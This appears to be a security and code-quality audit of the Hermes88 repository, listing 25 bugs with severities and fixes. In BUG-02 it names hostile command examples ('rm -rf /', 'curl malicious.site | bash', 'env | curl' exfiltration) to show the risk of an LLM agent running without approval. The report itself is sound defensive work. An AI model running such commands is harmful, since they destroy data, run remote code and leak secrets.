# Hermes88 Bug Report

Repository: `Architect8989/Hermes88`
Analysis date: 2026-05-14
Method: AST parsing, manual code review, cross-file data flow tracing
Total issues found: 25

---

## CRITICAL (3)

### BUG-01: Python Syntax Error — entire bot/telegram_bot.py is non-functional

**File:** `bot/telegram_bot.py` line ~537-543
**Type:** SYNTAX ERROR (FATAL)

```python
    finally:
        subprocess.run(
            ["git", "config", "--unset", "credential.helper"],
            cwd=workdir, capture_output=True,
        )

    except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
        print(f"[push-gh-L1] Failed: {type(e).__name__}", file=sys.stderr)
        return None
```

The `except` block appears AFTER the `finally` block in `_push_github_layer1_local_git`. Python requires `try → except → finally` ordering. This is a hard syntax error.

**Impact:** The file cannot be imported or executed. `python3 bot/telegram_bot.py` crashes immediately with `SyntaxError: invalid syntax`. Every CLI action (push-commit, bounded-run, ingest-media, rotate-camofox-key, health-check) is dead. This is the most-used utility in the entire system.

---

### BUG-02: HERMES_YOLO_MODE=1 set in production

**File:** `scripts/init_and_start.sh` line ~95
**Type:** SECURITY VIOLATION

```bash
export HERMES_YOLO_MODE=1
```

This causes openclaude gRPC server to pass `--dangerously-skip-permissions` to the openclaude binary. Any LLM-generated shell command executes without human approval. The LLM can generate `rm -rf /`, `curl malicious.site | bash`, `git push --force`, exfiltrate secrets via `env | curl`, etc.

The system's own documentation (config.yaml, server.py, SOUL.md) explicitly warns against this setting multiple times.

**Impact:** Arbitrary code execution by LLM without operator approval on the production VPS.

---

### BUG-03: docker-compose.peak.yml references nonexistent Dockerfile

**File:** `docker-compose.peak.yml` line ~35
**Type:** BUILD FAILURE

```yaml
hermes:
  build:
    context: .
    dockerfile: Dockerfile.peak
```

`Dockerfile.peak` does not exist in the repository. Only `Dockerfile`, `Dockerfile.vps`, `Dockerfile.camofox`, `Dockerfile.webhook`, `Dockerfile.sandbox`, and `Dockerfile.sandbox-manager` exist.

**Impact:** `docker compose -f docker-compose.peak.yml up -d --build` fails immediately. The "peak architecture" deployment is completely non-functional.

---

## HIGH (5)

### BUG-04: send_file.py delivers files to random Telegram users

**File:** `send_file.py` line ~47-75
**Type:** SECURITY RISK

When `TELEGRAM_CHAT_ID` is not set, `_discover_chat_id()` picks the most recent person who messaged the bot. If the bot has no allowlist, sensitive files (code, configs, audit reports) get sent to whoever last talked to it.

No hard failure is enforced. The code prints a warning to stderr but proceeds with delivery.

**Impact:** Confidential files sent to unintended recipients.

---

### BUG-05: jcode swarm workers corrupt shared files via hardlinks

**File:** `bot/telegram_bot.py` line ~290-305
**Type:** LOGIC ERROR (DATA CORRUPTION)

When bounded-run escalates to jcode swarm, it writes `file:///tmp/repos/REPONAME` URLs to a JSON file. `spawn.py` then runs `git clone --depth 1 <file_url> <tmpdir>`. Git clone of local file:// paths uses hardlinks by default (same filesystem). Multiple jcode workers writing to their "isolated" clones actually modify the same inodes — corrupting each other and the original repo.

**Fix:** Add `--no-hardlinks` to the git clone command in spawn.py, or use `cp -r` instead.

**Impact:** Parallel workers silently overwrite each other's changes.

---

### BUG-06: sandbox/go.sum missing — sandbox-manager cannot build

**File:** `sandbox/go.mod` (go.sum absent)
**Type:** BUILD FAILURE

`go.mod` declares dependencies (`github.com/docker/docker`, `github.com/docker/go-connections`, etc.) but no `go.sum` file exists. `go mod download` in `Dockerfile.sandbox-manager` will fail with checksum verification errors.

**Impact:** `docker build -f Dockerfile.sandbox-manager .` fails.

---

### BUG-07: Redis exposed without authentication in peak deployment

**File:** `docker-compose.peak.yml` redis service
**Type:** SECURITY RISK

```yaml
redis:
  ports:
    - "6379:6379"
    - "8001:8001"
```

No host binding restriction (unlike docker-compose.yml which binds to 127.0.0.1). No `REDIS_PASSWORD`. Redis Stack listens on all interfaces with no auth. Anyone on the network can connect, read webhook event history (Stripe payment data, GitHub secrets), and inject commands.

**Impact:** Full read/write access to Redis from any network peer.

---

### BUG-08: gRPC server leaks orphaned openclaude processes

**File:** `skills/openclaude_grpc/server.py` line ~130-140
**Type:** RESOURCE LEAK / HANG

```python
proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, ...)
for line in proc.stdout:
    yield ...
```

No timeout on the subprocess. No signal handling when the gRPC client disconnects. If openclaude hangs (network wait, infinite loop), the subprocess runs forever. The gRPC framework closes the stream but the Popen process is never killed.

**Impact:** Orphaned processes accumulate memory and CPU over time.

---

## MEDIUM (8)

### BUG-09: TOCTOU race in sandbox capacity check

**File:** `sandbox/executor.go` line ~106-113
**Type:** RACE CONDITION

```go
manager.mu.RLock()
activeCount := len(manager.sandboxes)
manager.mu.RUnlock()
// <-- gap: another goroutine can also pass this check
if activeCount >= manager.config.MaxConcurrent {
    return nil, fmt.Errorf("maximum concurrent sandboxes reached")
}
// ... creates container ...
manager.mu.Lock()
manager.sandboxes[sandboxID] = sandbox
manager.mu.Unlock()
```

Between reading the count and registering the new sandbox, N concurrent requests can all pass the capacity check.

**Fix:** Hold a write lock across the entire capacity-check-and-register operation, or use an atomic counter/semaphore.

---

### BUG-10: Credential helper persists after SIGKILL

**File:** `bot/telegram_bot.py` line ~537 (finally block)
**Type:** CREDENTIAL EXPOSURE

The git credential.helper containing the raw token (`!f() { echo 'password=TOKEN'; }; f`) is written to `.git/config` before push operations. The `finally` block removes it. If the process receives SIGKILL (not SIGTERM), the finally block never executes.

**Impact:** Token persists in `.git/config` in `/tmp/repos/<name>/` until container restart.

---

### BUG-11: jcode spawn.py never cleans up temp directories

**File:** `skills/jcode_swarm/spawn.py` line ~27-30
**Type:** RESOURCE LEAK

```python
workdir = tempfile.mkdtemp(prefix=f"swarm_{idx}_")
# ... git clone + jcode work ...
# No cleanup. Ever.
```

Each swarm invocation leaves a full git clone in `/tmp/swarm_N_*`. With 3 workers per escalation and multiple escalations per day, `/tmp` fills.

**Impact:** Disk exhaustion in long-running containers.

---

### BUG-12: Dockerfile (generic) silently produces broken image

**File:** `Dockerfile` line ~65-67
**Type:** BUILD FAILURE (SILENT)

```dockerfile
RUN pip3 install --no-cache-dir "hermes-agent[messaging]>=0.10.0" \
    || pip3 install --no-cache-dir "hermes-agent>=0.10.0" \
    || echo "[hermes-agent] PyPI package not available..."
```

hermes-agent is not on PyPI. Both pip commands fail. The `echo` masks the failure. The built image has no hermes-agent, and the runtime failure is delayed and confusing.

---

### BUG-13: Unencrypted sensitive data stored in Redis

**File:** `webhook/src/redis.ts` line ~160-163
**Type:** DATA RETENTION RISK

Every published event (Stripe payments, GitHub webhook bodies) is stored in a Redis list (`hermes:events:history`) with no TTL and no encryption. The list is trimmed to 1000 entries but never expires.

---

### BUG-14: config.yaml template variables unexpanded outside Docker

**File:** `hermes_config/config.yaml`
**Type:** CONFIGURATION ERROR

```yaml
redis_url: "${REDIS_URL}"
api_key: "${DO_INFERENCE_API_KEY}"
```

These are expanded by init_and_start.sh (Python string.Template). Running `python3 main.py` directly without init_and_start.sh leaves literal `${VAR}` strings as the configuration values.

---

### BUG-15: enforceTimeout + KillSandbox double-remove race

**File:** `sandbox/executor.go` line ~396-420
**Type:** RACE CONDITION

If the timeout goroutine fires simultaneously with a manual KillSandbox call, both attempt `ContainerStop` → `removeContainer` → `cleanupTracking` on the same container. Docker handles double-remove gracefully (returns 404/409), but it's wasted work and noisy error logs.

---

### BUG-16: bounded-run timeout does not kill child process

**File:** `bot/telegram_bot.py` (run_bounded function)
**Type:** RESOURCE LEAK

```python
result = subprocess.run(cmd, shell=True, ..., timeout=per_strike_timeout)
```

`subprocess.run` with `timeout` raises `TimeoutExpired` but when `shell=True`, it only kills the shell process, not the child process tree. Long-running test suites (pytest with many workers) continue running as orphans after timeout.

**Fix:** Use `process_group` or `os.killpg` to kill the entire process tree.

---

## LOW (9)

### BUG-17: Unreachable error message in gateway/run.py

**File:** `gateway/run.py` line ~93, ~131
**Type:** UNREACHABLE CODE

The friendly "FATAL: os.execvpe failed unexpectedly" message at the end of main() is unreachable. os.execvpe either succeeds (never returns) or raises an exception (which bypasses the print statement). A PermissionError produces an uncaught traceback instead.

---

### BUG-18: main.py has two identical fallback functions

**File:** `main.py` line ~55-65
**Type:** LOGIC ERROR

`_start_with_module()` and `_start_with_gateway()` both execute `python3 -m gateway.run`. The detection logic that chooses between them is pointless — the outcome is identical.

---

### BUG-19: init_and_start.sh set -e with || masking

**File:** `scripts/init_and_start.sh`
**Type:** MASKED FAILURES

`set -e` combined with `|| true` / `|| echo` on critical commands creates false confidence. If openclaw is broken, jcode is missing, or MCP config fails, the errors are swallowed and supervisord starts with a partially configured environment.

---

### BUG-20: Unused nat import in Go sandbox

**File:** `sandbox/executor.go` line ~567
**Type:** DEAD CODE

```go
var _ = nat.Port("")
```

The `nat` package is imported and referenced only to suppress the compiler error. It serves no functional purpose. Adds ~2MB to the binary.

---

### BUG-21: Express async handler catch can swallow rejections

**File:** `webhook/src/server.ts` line ~120-140
**Type:** UNHANDLED PROMISE REJECTION

If `res.headersSent` check or `res.status(500).json(...)` itself throws inside the `.catch()` handler (e.g., socket already destroyed), the rejection goes unhandled. Mitigated by the defensive `if (!res.headersSent)` check.

---

### BUG-22: supervisord restart can briefly overlap Telegram polling

**File:** `supervisord.conf`
**Type:** RACE CONDITION (MINOR)

If hermes-gateway crashes and restarts within `startsecs=15`, the old process's Telegram getUpdates long-poll may still be active (30s default timeout). Two simultaneous pollers cause Telegram to return HTTP 409 Conflict. The old connection dies naturally within 30s, but errors appear in logs during the overlap.

---

### BUG-23: cleanupStale operates on stale snapshot

**File:** `sandbox/executor.go` line ~444-495
**Type:** RACE CONDITION (THEORETICAL)

trackedIDs snapshot taken under RLock can be stale by the time the container list is iterated. In theory a just-created container could appear in the Docker list before it appears in the tracked map. Impossible in practice because container creation takes longer than the lock-to-list gap.

---

### BUG-24: agentic_client.py bypasses gRPC despite being in openclaude_grpc/

**File:** `skills/openclaude_grpc/agentic_client.py`
**Type:** ARCHITECTURAL INCONSISTENCY

The agentic client calls the DO Inference HTTP API directly for its plan/edit/verify loop. It does not use the gRPC server at all. Two code paths exist for openclaude integration: client.py (gRPC) and agentic_client.py (direct HTTP). SOUL.md recommends the agentic_client for complex tasks.

---

### BUG-25: Metrics not persisted across webhook server restarts

**File:** `webhook/src/utils.ts`
**Type:** DATA LOSS

```typescript
const metrics = {
  events_received: 0,
  ...
};
```

Metrics are in-memory only. Every restart zeros them. The `/metrics` endpoint shows counters since last boot, not lifetime totals. Not a bug per se, but the lack of Redis-backed metrics means operational visibility resets on every deploy.

---

## Summary by Severity

| Severity | Count | Key Examples |
|---|---|---|
| CRITICAL | 3 | Syntax error (file unrunnable), YOLO mode in prod, broken peak compose |
| HIGH | 5 | File delivery to strangers, hardlink corruption, Redis exposed, go.sum missing, process leak |
| MEDIUM | 8 | TOCTOU race, credential exposure, temp leaks, silent build failures |
| LOW | 9 | Unreachable code, dead imports, masked errors, minor races |

---

## Most Urgent Fixes (in priority order)

1. **Fix the syntax error in telegram_bot.py** — move the `except` block before `finally`. Without this, push-commit, bounded-run, and health-check are all dead.
2. **Set HERMES_YOLO_MODE=0** in init_and_start.sh (or implement the ActionRequired approval loop).
3. **Create Dockerfile.peak** or change docker-compose.peak.yml to reference Dockerfile.vps.
4. **Generate go.sum** — run `go mod tidy` in sandbox/ and commit the result.
5. **Bind Redis to 127.0.0.1** in docker-compose.peak.yml.
6. **Add --no-hardlinks** to the git clone in spawn.py.
7. **Add subprocess kill on gRPC stream cancellation** in server.py.
8. **Set TELEGRAM_CHAT_ID as mandatory** — fail hard in send_file.py if unset.
